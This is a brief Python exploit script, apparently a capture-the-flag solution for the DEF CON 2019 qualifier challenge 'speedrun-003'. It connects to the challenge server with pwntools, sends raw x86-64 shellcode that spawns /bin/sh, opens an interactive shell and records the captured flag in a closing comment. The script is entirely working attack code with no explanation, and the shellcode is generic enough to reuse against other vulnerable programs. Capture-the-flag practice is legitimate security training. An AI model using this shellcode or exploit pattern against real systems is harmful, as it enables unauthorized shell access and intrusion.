from pwn import *

r = remote("speedrun-003.quals2019.oooverflow.io", 31337)
r.recvuntil("Send me your drift")

shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\x50\x50\x50\x50\x50\x5f"

r.sendline(shellcode)
r.interactive()

#OOO{Fifty percent of something is better than a hundred percent of nothing. (except when it comes to pwning)}